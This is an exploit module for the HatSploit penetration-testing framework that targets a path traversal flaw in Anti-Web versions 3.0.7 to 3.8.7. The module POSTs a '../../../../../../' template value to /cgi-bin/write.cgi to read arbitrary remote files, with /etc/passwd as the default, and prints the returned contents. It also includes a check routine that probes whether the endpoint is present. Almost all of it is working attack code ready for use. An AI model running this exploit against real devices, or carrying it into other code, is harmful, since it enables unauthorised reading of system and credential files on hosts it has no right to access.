"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Anti-Web Path Traversal",
            'Module': "exploit/linux/antiweb/path_traversal",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Bertin Jose - vulnerability researcher',
                'Fernandez Ezequiel - vulnerability researcher',
            ],
            'Description': "Path Traversal in Anti-Web v3.0.7 till v3.8.7.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 80,
                'Type': "port",
                'Required': True,
            },
            'RFILE': {
                'Description': "Remote file to read.",
                'Value': "/etc/passwd",
                'Type': None,
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port, remote_file):
        response = self.http_request(
            method="POST",
            host=remote_host,
            port=remote_port,
            path='/cgi-bin/write.cgi',
            data=f'page=/&template=../../../../../../{remote_file}',
            headers={
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        )

        if response.text:
            self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")

    def check(self):
        remote_host, remote_port, _ = self.parse_options(self.options)

        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path='/cgi-bin/write.cgi'
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port, remote_file = self.parse_options(self.options)

        self.exploit(remote_host, remote_port, remote_file)
